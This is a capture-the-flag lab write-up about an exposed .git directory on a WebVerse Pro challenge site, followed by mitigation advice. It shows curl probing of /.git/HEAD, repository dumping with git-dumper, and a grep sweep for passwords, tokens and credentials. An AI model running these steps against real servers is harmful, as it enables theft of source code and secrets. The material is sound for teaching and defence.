---
title: "Information Disclosure via Exposed Git Repository | GamedYourself"
date: 2026-06-24 07:30:00 +0530
categories: [A02 - Security Misconfiguration, Information Disclosure]
tags: [information-disclosure, exposed-git, source-code-disclosure, git-dumper, webverse, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/gamedyourself.webp
  alt: GamedYourself Information Disclosure
---

## Lab Link

[WebVerse Pro - GamedYourself](https://dashboard.webverselabs-pro.com/mystery-challenges/gamedyourself)

---

## Overview

**GamedYourself** was a WebVerse Pro challenge themed around a retro arcade/pinball site. The application itself looked like a normal public-facing website, but the deployment had accidentally exposed internal development artifacts.

The vulnerability was an **exposed `.git` directory**, which allowed downloading the full Git repository from the live web server. By reconstructing the repository and reviewing commit history, sensitive deployment data was discovered.

---

## Objective

The goal of the challenge was to:

- Inspect the deployed web application
- Identify exposed development or deployment artifacts
- Recover sensitive information from the leaked repository
- Retrieve the flag

---

## Vulnerability Identification

| Category | Details |
|---|---|
| OWASP Top 10:2025 | **A02 - Security Misconfiguration** |
| Vulnerability | Information Disclosure |
| Root Cause | `.git` directory exposed on the production web server |
| Impact | Source code disclosure and secret leakage |
| Exploitation Method | Git repository dumping and commit history analysis |

---

## Reconnaissance

The application appeared to be a simple public website for an arcade/pinball business.

The challenge description hinted at a careless deployment:

> “pushed it straight to the box”  
> “nobody went back to check the deploy over”

These hints suggested that deployment artifacts may have been left accessible on the server.

A common file to test in this situation is:

```bash
/.git/HEAD
```

Request:

```bash
curl -k https://REDACTED-LAB-HOST/.git/HEAD
```

Response:

```text
ref: refs/heads/main
```

This confirmed that the `.git` directory was publicly accessible.

---

## Approach

Once `.git/HEAD` was accessible, the next step was to reconstruct the repository.

The exposed Git metadata allowed the repository to be dumped from the web server using `git-dumper`. After recovering the repository, the commit history and source files were reviewed for secrets, deployment files, and references to the WebVerse flag.

---

## Exploitation

### 1. Dumping the Exposed Git Repository

The exposed repository was dumped with `git-dumper`:

```bash
git-dumper https://REDACTED-LAB-HOST/.git/ ./repo-dump
```

After the dump completed, I moved into the recovered repository:

```bash
cd repo-dump
```

---

### 2. Reviewing Git Commit History

The Git history was checked to understand what had been committed to the project:

```bash
git log --oneline
```

Output:

```text
7905fe9 Add deploy env for the box that hosts the site
6e4a730 Add parties and visit pages
faa67b4 Launch the new Pinball Republic site
```

The latest commit was especially suspicious:

```text
Add deploy env for the box that hosts the site
```

Deployment environment files often contain secrets, API keys, credentials, or challenge flags.

---

### 3. Searching for Sensitive Data

A recursive keyword search was performed across the recovered source code:

```bash
grep -r "password\|secret\|key\|token\|api\|auth\|credential\|WEBVERSE" . --exclude-dir=.git
```

This helped identify potentially sensitive files and references inside the recovered repository.

---

### 4. Inspecting the Suspicious Commit

The deployment-related commit was inspected directly:

```bash
git show 7905fe9
```

The recovered commit exposed deployment-related environment data. Inside the leaked deployment configuration, the flag was discovered.

---

## Proof of Exploitation

The publicly exposed `.git` directory allowed full repository recovery.

Request:

```bash
curl -k https://REDACTED-LAB-HOST/.git/HEAD
```

Confirmed Git reference:

```text
ref: refs/heads/main
```

Repository history revealed a deployment-related commit:

```text
7905fe9 Add deploy env for the box that hosts the site
```

The leaked deployment environment contained the flag:

```text
WEBVERSE{.....}
```

---

## Root Cause

The root cause was an insecure production deployment.

The `.git` directory was copied to the web root and served by the web server. This exposed:

- Git metadata
- Source code
- Commit history
- Potentially deleted files
- Deployment configuration
- Secrets and environment variables

Even if sensitive files are removed later, Git history can still preserve them.

---

## Impact

An attacker could use the exposed repository to:

- Download the full application source code
- Review historical commits
- Recover deleted secrets
- Discover hidden endpoints
- Identify credentials or tokens
- Understand application logic
- Escalate to further compromise

In this lab, the exposure directly led to disclosure of the challenge flag.

---

## Mitigation

### 1. Never Deploy `.git` to Production

Production deployments should only contain required application files.

Avoid copying the full working directory directly to the server.

Bad practice:

```bash
scp -r ./project user@server:/var/www/html
```

Safer approach:

```bash
git archive --format=tar HEAD | tar -x -C /var/www/html
```

---

### 2. Block Access to Git Metadata

For Nginx:

```nginx
location ~ /\.git {
    deny all;
    return 403;
}
```

For Apache:

```apache
RedirectMatch 404 /\.git
```

---

### 3. Use a Proper Deployment Pipeline

A secure deployment process should:

- Build artifacts separately
- Exclude development files
- Exclude `.git`
- Exclude `.env`
- Exclude test files
- Exclude backup files

Example `.dockerignore` or deployment ignore rules:

```text
.git
.gitignore
.env
.env.*
node_modules
tests
*.bak
*.old
```

---

### 4. Rotate Exposed Secrets

If a Git repository is exposed, assume all secrets inside it are compromised.

Immediately rotate:

- API keys
- Database passwords
- Session secrets
- Deployment tokens
- Cloud credentials

---

### 5. Monitor for Exposed Artifacts

Regularly scan production servers for sensitive files:

```text
/.git/HEAD
/.env
/config.php.bak
/backup.zip
/.DS_Store
```

Automated security checks should be part of CI/CD.

---

## Lessons Learned

- Publicly accessible `.git` folders can expose the entire application history.
- Sensitive data may remain recoverable even after being deleted from the latest commit.
- Commit messages can provide useful clues during security testing.
- Deployment pipelines should publish build artifacts, not raw source directories.
- Source code disclosure often leads to credential or secret leakage.

---

## Conclusion

The **GamedYourself** challenge demonstrated a classic but high-impact information disclosure issue caused by an exposed Git repository.

By identifying the accessible `.git` directory, dumping the repository, and reviewing commit history, sensitive deployment data was recovered and the flag was obtained.

This is a strong reminder that production servers should never expose development metadata or version control history.
